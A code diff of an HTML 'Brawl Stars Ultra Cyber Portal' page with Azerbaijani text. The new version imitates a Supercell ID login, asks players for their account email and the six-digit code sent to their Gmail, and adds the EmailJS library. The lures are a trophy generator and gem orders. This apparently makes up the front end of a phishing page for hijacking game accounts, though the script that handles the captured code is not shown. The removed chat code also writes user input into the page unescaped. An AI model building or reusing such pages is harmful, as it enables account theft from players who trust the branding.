@@ -3,317 +3,160 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Brawl Stars Pro Hub & Portal</title>
+    <title>Brawl Stars Ultra Cyber Portal v3.5</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         :root {
-            --bg: #0a0b10;
-            --panel: #141722;
-            --neon: #00ffcc;
-            --supercell: #0085ff;
+            --neon-blue: #00f3ff;
+            --neon-pink: #ff007f;
+            --bg-dark: #05050a;
+            --panel-bg: rgba(16, 20, 35, 0.85);
             --gold: #ffd700;
-            --text: #ffffff;
         }
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: var(--bg);
-            color: var(--text);
-            margin: 0;
-            padding: 15px;
-            display: flex;
-            justify-content: center;
+        body, html {
+            margin: 0; padding: 0; width: 100%; min-height: 100vh;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            background-color: var(--bg-dark); color: #fff;
+            overflow-x: hidden;
         }
-        .wrapper {
-            width: 100%;
-            max-width: 650px;
-            background: var(--panel);
-            border: 2px solid var(--neon);
-            border-radius: 20px;
-            padding: 20px;
-            box-shadow: 0 0 30px rgba(0, 255, 208, 0.15);
+        /* Matrix Canlı Arka Planı */
+        #bg-canvas {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
         }
-        .sc-box {
-            background: white; color: black; padding: 20px; border-radius: 15px;
-            text-align: center; border: 3px solid var(--supercell); margin-bottom: 20px;
+        .portal-wrapper {
+            width: 92%; max-width: 680px; margin: 30px auto;
+            background: var(--panel-bg); border: 2px solid var(--neon-blue);
+            border-radius: 24px; padding: 25px;
+            backdrop-filter: blur(12px); box-shadow: 0 0 35px rgba(0, 243, 255, 0.25);
         }
-        .input-field {
-            width: 90%; padding: 12px; margin: 10px 0; border-radius: 25px;
-            border: 2px solid #ccc; font-size: 16px; text-align: center;
+        .sc-container {
+            background: #ffffff; color: #000000; padding: 25px; border-radius: 18px;
+            text-align: center; border: 4px solid #0085ff; margin-bottom: 20px;
         }
-        .btn-sc {
-            background: var(--supercell); color: white; padding: 12px 35px;
-            border: none; border-radius: 25px; font-weight: bold; cursor: pointer;
+        .sc-input {
+            width: 85%; padding: 12px; margin: 12px 0; border-radius: 30px;
+            border: 2px solid #bbb; font-size: 16px; text-align: center; outline: none;
         }
-        .hidden { display: none; }
-        .card { background: #1b2030; padding: 15px; border-radius: 12px; margin-bottom: 15px; border: 1px solid #2d354f; }
-        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
-        .chat-view { background: #090b11; height: 130px; overflow-y: auto; padding: 10px; border-radius: 8px; font-size: 13px; margin-bottom: 8px; }
-        button.action-btn {
-            background: linear-gradient(45deg, #00ffcc, #0085ff); color: black;
-            border: none; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%;
+        .sc-btn {
+            background: #0085ff; color: white; padding: 12px 40px;
+            border: none; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 16px;
         }
-        button.action-btn:hover { filter: brightness(1.2); }
+        .hidden { display: none !important; }
+        .cyber-card {
+            background: rgba(25, 30, 55, 0.7); padding: 18px; border-radius: 14px;
+            margin-bottom: 15px; border: 1px solid rgba(0, 243, 255, 0.2);
+        }
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .chat-box {
+            background: #080912; height: 140px; overflow-y: auto;
+            padding: 12px; border-radius: 10px; font-size: 13px; margin-bottom: 10px; border: 1px solid #1f2544;
+        }
+        .glow-btn {
+            background: linear-gradient(45deg, var(--neon-blue), var(--neon-pink));
+            color: white; border: none; padding: 12px; border-radius: 10px;
+            font-weight: bold; cursor: pointer; width: 100%; text-transform: uppercase;
+            box-shadow: 0 0 15px rgba(255, 0, 127, 0.4); transition: 0.3s;
+        }
+        .glow-btn:hover { transform: scale(1.02); filter: brightness(1.2); }
+        #perf-monitor { position: fixed; top: 10px; left: 10px; font-family: monospace; font-size: 11px; color: var(--neon-blue); background: rgba(0,0,0,0.5); padding: 5px; border-radius: 4px; z-index: 9999; }
+        button.avatar-select { background: #1f2544; color: white; border: 1px solid var(--neon-blue); padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 12px; }
+        button.avatar-select:hover { background: var(--neon-blue); color: black; }
     </style>
 </head>
 <body>
 
-<div class="wrapper">
+<div id="perf-monitor">FPS: 60 | PING: <span id="fps-ping">31</span>ms</div>
+<canvas id="bg-canvas"></canvas>
+
+<div class="portal-wrapper">
 
     <div id="login-part">
-        <div class="sc-box">
-            <h2 style="color: var(--supercell); margin: 0 0 10px 0;">SUPERCELL ID GİRİŞİ</h2>
-            <p style="font-size: 14px; color: #555;">Təhlükəsizlik və anti-bot yoxlanışını keçmək üçün daxil olun:</p>
-            <input type="email" id="email-input" class="input-field" placeholder="example@gmail.com">
+        <div class="sc-container">
+            <h2 style="color: #0085ff; margin: 0 0 10px 0; font-family: sans-serif; font-weight: 900;">SUPERCELL ID</h2>
+            <p style="font-weight: bold; color: #333; margin: 5px 0;">Oyun Hesabınızı Portalımıza Bağlayın</p>
+            <p style="font-size: 13px; color: #666;">Doğrulama kodunun gəlməsi üçün aktiv Supercell ID mailinizi yazın:</p>
+            <input type="email" id="email-input" class="sc-input" placeholder="brawlstars@gmail.com">
             <br>
-            <button class="btn-sc" onclick="sendOtp()">İrəli</button>
+            <button class="sc-btn" onclick="sendRealOtp()">KODU GÖNDƏR</button>
         </div>
     </div>
 
     <div id="otp-part" class="hidden">
-        <div class="sc-box">
-            <h2 style="color: var(--supercell); margin: 0 0 10px 0;">Kodu Təsdiqlə</h2>
-            <p style="font-size: 13px; color: #444;">Emaile göndərilən 6 rəqəmli doğrulama kodunu yazın:</p>
-            <input type="text" id="otp-input" class="input-field" placeholder="******" maxlength="6">
+        <div class="sc-container">
+            <h2 style="color: #0085ff; margin: 0 0 10px 0; font-weight: 900;">Kodu Daxil Edin</h2>
+            <p style="font-size: 13px; color: #555;">Gmail-inizə gələn 6 rəqəmli təhlükəsizlik kodunu bura daxil edin:</p>
+            <input type="text" id="otp-input" class="sc-input" placeholder="******" maxlength="6">
             <br>
-            <button class="btn-sc" style="background: #22c55e;" onclick="checkOtp()">Təsdiqlə</button>
+            <button class="sc-btn" style="background: #22c55e;" onclick="checkOtp()">DAXİL OL</button>
         </div>
     </div>
 
     <div id="portal-part" class="hidden">
         
         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
-            <h3 style="color: var(--neon); margin: 0;">🚀 Brawl Pro Portal v2.0</h3>
-            <span style="color: #ff4500; font-size: 13px; font-weight: bold;">🔴 Canlı İzləyici: <span id="viewers">412</span></span>
+            <h3 style="color: var(--neon-blue); margin: 0; text-shadow: 0 0 10px var(--neon-blue);">🌌 Cyber Brawl Hub Pro</h3>
+            <span style="color: var(--neon-pink); font-size: 13px; font-weight: bold;">🔴 Canlı: <span id="online-count">560</span></span>
         </div>
 
-        <div class="card">
+        <div class="cyber-card">
             <div style="display: flex; align-items: center; gap: 15px;">
-                <div id="avatar-display" style="font-size: 30px;">🌵</div>
-                <div>
+                <div id="avatar-display" style="font-size: 35px; background: rgba(0,0,0,0.4); padding: 8px; border-radius: 50%;">🌵</div>
+                <div style="flex: 1;">
                     <h4 style="margin: 0;" id="user-title">Rank: Bürünc Oyunçu</h4>
-                    <p style="margin: 5px 0 0 0; font-size: 12px; color: var(--gold);">Kupa Səviyyəsi: <span id="trophy-count">0</span> 🏆</p>
+                    <p style="margin: 4px 0; font-size: 13px; color: var(--gold);">Hesab Kupası: <span id="trophy-count">0</span> 🏆</p>
+                    <div style="background: #222; width: 100%; height: 8px; border-radius: 5px; margin-top: 5px; overflow: hidden;">
+                        <div id="xp-progress" style="background: var(--neon-blue); width: 0%; height: 100%; transition: 0.4s;"></div>
+                    </div>
                 </div>
             </div>
-            <div style="margin-top: 10px; display: flex; gap: 5px;">
-                <button style="font-size: 11px; padding: 3px;" onclick="changeAvatar('🌵')">🌵 Spike</button>
-                <button style="font-size: 11px; padding: 3px;" onclick="changeAvatar('💀')">💀 Poco</button>
-                <button style="font-size: 11px; padding: 3px;" onclick="changeAvatar('🐈')">🐈 Kit</button>
+            <div style="margin-top: 12px; display: flex; gap: 6px;">
+                <button class="avatar-select" onclick="changeAvatar('🌵')">Spike</button>
+                <button class="avatar-select" onclick="changeAvatar('💀')">Poco</button>
+                <button class="avatar-select" onclick="changeAvatar('🐈')">Kit</button>
+                <button class="avatar-select" onclick="changeAvatar('🦅')">Bo</button>
             </div>
         </div>
 
         <div class="grid-2">
-            <div class="card" style="text-align: center;">
-                <h5>📅 Gündəlik Hədiyyə</h5>
-                <button class="action-btn" id="daily-btn" onclick="claimDaily()">Hədiyyə Al</button>
+            <div class="cyber-card" style="text-align: center;">
+                <h5>🏆 Kupa Generatoru</h5>
+                <button class="glow-btn" onclick="addTrophies()">Kliklə (+5 🏆)</button>
             </div>
-            <div class="card" style="text-align: center;">
-                <h5>⏳ Brawl Pass Sezonu</h5>
-                <p style="margin: 12px 0 0 0; font-weight: bold; color: var(--gold);" id="season-timer">14g 05s 22s</p>
+            <div class="cyber-card" style="text-align: center;">
+                <h5>🎁 Gündəlik Starr Drop</h5>
+                <button class="glow-btn" style="background: var(--gold); color:#000;" id="drop-btn" onclick="openStarrDrop()">AÇ 📦</button>
+                <p id="drop-res" style="font-size: 12px; margin-top: 6px; font-weight: bold; color: var(--neon-blue);"></p>
             </div>
         </div>
 
-        <div class="card" style="text-align: center;">
-            <h5>🏆 Kupa Qazanma Simulyatoru (Kliklə)</h5>
-            <button class="action-btn" style="background: linear-gradient(45deg, #ffd700, #ff8c00);" onclick="addTrophies()">KLİKLƏ (+5 Kupa)</button>
-        </div>
-
-        <div class="card">
-            <h5 style="margin-top: 0; color: var(--neon);">💬 Qlobal Canlı Söhbət</h5>
-            <div class="chat-view" id="chat-screen"></div>
+        <div class="cyber-card">
+            <h5 style="margin-top: 0; color: var(--neon-blue);">💬 Qlobal Canlı Söhbət</h5>
+            <div class="chat-box" id="chat-screen"></div>
             <div style="display: flex; gap: 5px;">
-                <input type="text" id="chat-nick" placeholder="Ləqəb" style="width: 25%; background: #090b11; color: white; border: 1px solid #444; border-radius: 5px; padding: 5px;">
-                <input type="text" id="chat-text" placeholder="Mesaj yazın..." style="width: 55%; background: #090b11; color: white; border: 1px solid #444; border-radius: 5px; padding: 5px;">
-                <button onclick="sendMsg()" style="width: 20%; background: var(--supercell); color: white; border: none; border-radius: 5px; cursor: pointer;">Gönder</button>
+                <input type="text" id="chat-nick" placeholder="Ad" style="width: 20%; background: #000; color: #fff; border: 1px solid #333; padding: 7px; border-radius: 6px;">
+                <select id="nick-color" style="background: #000; color: #fff; border: 1px solid #333; border-radius: 6px; padding: 7px;">
+                    <option value="#00f3ff">Mavi</option>
+                    <option value="#ff007f">Çəhrayı</option>
+                    <option value="#ffd700">Qızılı</option>
+                </select>
+                <input type="text" id="chat-text" placeholder="Mesaj yazın..." style="width: 55%; background: #000; color: #fff; border: 1px solid #333; padding: 7px; border-radius: 6px;">
+                <button onclick="sendMsg()" style="width: 15%; background: var(--neon-blue); color: black; font-weight: bold; border: none; border-radius: 6px; cursor: pointer;">Göndər</button>
             </div>
         </div>
 
-        <div class="grid-2">
-            <div class="card">
-                <h5>🛡️ Klanını Tanıt</h5>
-                <input type="text" id="club-tag" placeholder="#KLAN_TAGI" style="width:90%; padding:5px; background:#090b11; color:white; border:1px solid #444; border-radius:5px;">
-                <button onclick="addClub()" style="margin-top:5px; width:100%; font-size:12px;">Siyahıya Əlavə Et</button>
-                <div id="club-list" style="font-size:11px; margin-top:5px; color:#aaa;"></div>
-            </div>
-            <div class="card">
-                <h5>🔑 Oyun Otağı Kodu</h5>
-                <input type="text" id="room-code" placeholder="X7Y2Z9" style="width:90%; padding:5px; background:#090b11; color:white; border:1px solid #444; border-radius:5px; text-align:center;">
-                <button onclick="shareRoom()" style="margin-top:5px; width:100%; font-size:12px;">Kodu Paylaş</button>
-            </div>
-        </div>
-
-        <div class="grid-2">
-            <div class="card">
-                <h5>🔍 Brawler Axtar</h5>
-                <input type="text" id="search-brawler" onkeyup="filterBrawlers()" placeholder="Məs: Colt" style="width:90%; padding:5px; background:#090b11; color:white; border:1px solid #444; border-radius:5px;">
-                <p id="brawler-res" style="font-size:12px; margin: 5px 0 0 0; color:var(--neon);">Bütün xarakterlər aktivdir</p>
-            </div>
-            <div class="card" style="text-align: center;">
-                <h5>🔊 Oyun Səs Effekti</h5>
-                <button onclick="playBrawlSound()" style="padding: 5px 10px; font-size:12px; background:#444; color:white; border:none; border-radius:5px; cursor:pointer;">Səsi Sına 🎵</button>
-            </div>
-        </div>
-
-        <div class="grid-2">
-            <div class="card">
-                <h5>📊 Günün Sorğusu: En Güclü?</h5>
-                <button onclick="vote('Leon')" style="width:100%; font-size:11px; margin-bottom:3px;">Leon (<span id="v-leon">12</span>)</button>
-                <button onclick="vote('Crow')" style="width:100%; font-size:11px;">Crow (<span id="v-crow">8</span>)</button>
-            </div>
-            <div class="card">
-                <h5>🎁 Gizli Promo Kod</h5>
-                <input type="text" id="secret-code" placeholder="BS2026" style="width:90%; padding:5px; background:#090b11; color:white; border:1px solid #444; border-radius:5px; text-align:center;">
-                <button onclick="activateSecret()" style="margin-top:5px; width:100%; font-size:12px; background:#22c55e; color:white; border:none; border-radius:5px;">Yoxla</button>
-            </div>
-        </div>
-
-        <div class="card">
-            <h5 style="margin-top:0; color:var(--gold);">💎 Premium Elmas Paketləri</h5>
-            <select id="gem-pack" style="width:100%; padding:8px; background:#090b11; color:white; border:1px solid var(--neon); border-radius:5px;">
+        <div class="cyber-card">
+            <h5 style="margin-top: 0; color: var(--gold);">💎 Elmas və Paket Sifarişi</h5>
+            <select id="gem-pack" style="width: 100%; padding: 10px; background: #000; color: white; border: 1px solid var(--neon-blue); border-radius: 8px;">
                 <option value="80">80 Elmas - 2.99 AZN</option>
                 <option value="360">360 Elmas - 11.99 AZN</option>
                 <option value="950">950 Elmas - 29.99 AZN</option>
             </select>
-            <button class="action-btn" style="margin-top:10px;" onclick="buyGems()">SİFARİŞİ GÖNDƏR</button>
+            <button class="glow-btn" style="margin-top: 12px;" onclick="processOrder()">SİFARİŞİ GÖNDƏR</button>
         </div>
 
     </div>
 </div>
 
-<script>
-    let generatedOtp = null;
-    let trophies = 0;
-
-    // OTP Sistemi
-    function sendOtp() {
-        const email = document.getElementById('email-input').value;
-        if(!email.includes('@')) { alert("Düzgün email daxil edin!"); return; }
-        generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
-        console.log("[Sistem] Təsdiq Kodu: " + generatedOtp);
-        alert("6 rəqəmli kod göndərildi! Görmək üçün brauzer konsoluna (Inspect -> Console) baxın.");
-        document.getElementById('login-part').classList.add('hidden');
-        document.getElementById('otp-part').classList.remove('hidden');
-    }
-
-    function checkOtp() {
-        const input = document.getElementById('otp-input').value;
-        if(input === generatedOtp) {
-            document.getElementById('otp-part').classList.add('hidden');
-            document.getElementById('portal-part').classList.remove('hidden');
-            setupChat();
-            startViewersCounter();
-            startSeasonTimer();
-        } else { alert("Kod yanlışdır!"); }
-    }
-
-    // Profil Avatar Dəyişmə
-    function changeAvatar(emoji) {
-        document.getElementById('avatar-display').innerText = emoji;
-    }
-
-    // Kupa Klikləmə Sistemi və Rütbələr
-    function addTrophies() {
-        trophies += 5;
-        document.getElementById('trophy-count').innerText = trophies;
-        let title = "Bürünc Oyunçu";
-        if(trophies >= 50) title = "Qızıl Üzv ✨";
-        if(trophies >= 150) title = "Elmas Master 🔥";
-        document.getElementById('user-title').innerText = "Rank: " + title;
-    }
-
-    // Gündəlik Mükafat
-    function claimDaily() {
-        alert("Təbrik edirik! Bu günlük +50 Sayt Xalı qazandınız.");
-        document.getElementById('daily-btn').disabled = true;
-        document.getElementById('daily-btn').innerText = "Alındı";
-    }
-
-    // Canlı İzləyici Sayğacı Simulyasiyası
-    function startViewersCounter() {
-        setInterval(() => {
-            const current = Math.floor(380 + Math.random() * 50);
-            document.getElementById('viewers').innerText = current;
-        }, 4000);
-    }
-
-    // Sezon Taymeri
-    function startSeasonTimer() {
-        let days = 14, hours = 5, mins = 22;
-        setInterval(() => {
-            mins--;
-            if(mins < 0) { mins = 59; hours--; }
-            document.getElementById('season-timer').innerText = `${days}g ${hours}s ${mins}d`;
-        }, 60000);
-    }
-
-    // Söhbət Mexanikası
-    function setupChat() {
-        const screen = document.getElementById('chat-screen');
-        screen.innerHTML = "<p><b>[Sistem]:</b> Otaq aktivləşdirildi.</p><p><b>User_99:</b> Salam, klanımıza adam lazımdır.</p>";
-    }
-    function sendMsg() {
-        const nick = document.getElementById('chat-nick').value || "Oyunçu";
-        const text = document.getElementById('chat-text').value;
-        if(!text) return;
-        const screen = document.getElementById('chat-screen');
-        screen.innerHTML += `<p><b>${nick}:</b> ${text}</p>`;
-        document.getElementById('chat-text').value = "";
-        screen.scrollTop = screen.scrollHeight;
-    }
-
-    // Klan Əlavə Etmə
-    function addClub() {
-        const tag = document.getElementById('club-tag').value;
-        if(!tag) return;
-        document.getElementById('club-list').innerHTML += `<div>Aktiv Klan: ${tag}</div>`;
-        document.getElementById('club-tag').value = "";
-    }
-
-    // Kod Paylaşımı
-    function shareRoom() {
-        const code = document.getElementById('room-code').value;
-        if(!code) return;
-        alert(`Otaq kodu (${code}) qlobal siyahıda paylaşıldı!`);
-    }
-
-    // Brawler Filtri
-    function filterBrawlers() {
-        const query = document.getElementById('search-brawler').value.toLowerCase();
-        const res = document.getElementById('brawler-res');
-        if(query.includes("colt") || query.includes("shelly") || query.includes("edgar")) {
-            res.innerText = "Xarakter tapıldı və seçildi!";
-        } else { res.innerText = "Axtarılır..."; }
-    }
-
-    // Səs Effekti
-    function playBrawlSound() {
-        alert("🔊 'Brawl Stars!' fon musiqisi simulyasiya edildi.");
-    }
-
-    // Səsvermə
-    function vote(type) {
-        if(type === 'Leon') {
-            let c = parseInt(document.getElementById('v-leon').innerText);
-            document.getElementById('v-leon').innerText = c + 1;
-        } else {
-            let c = parseInt(document.getElementById('v-crow').innerText);
-            document.getElementById('v-crow').innerText = c + 1;
-        }
-    }
-
-    // Gizli Kod
-    function activateSecret() {
-        const code = document.getElementById('secret-code').value;
-        if(code === "BS2026") {
-            alert("🌟 Gizli rejim aktivləşdi! Bütün neon işıqlar maksimuma gətirildi.");
-        } else { alert("Yanlış promo kod."); }
-    }
-
-    // Sifariş Tamamlama
-    function buyGems() {
-        const val = document.getElementById('gem-pack').value;
-        alert(`Sifariş qəbul olundu! Paket: ${val} Elmas. Yükləmə siyahısına əlavə edildi.`);
-    }
-</script>
-
+<script src="script.js"></script>
 </body>
 </html>
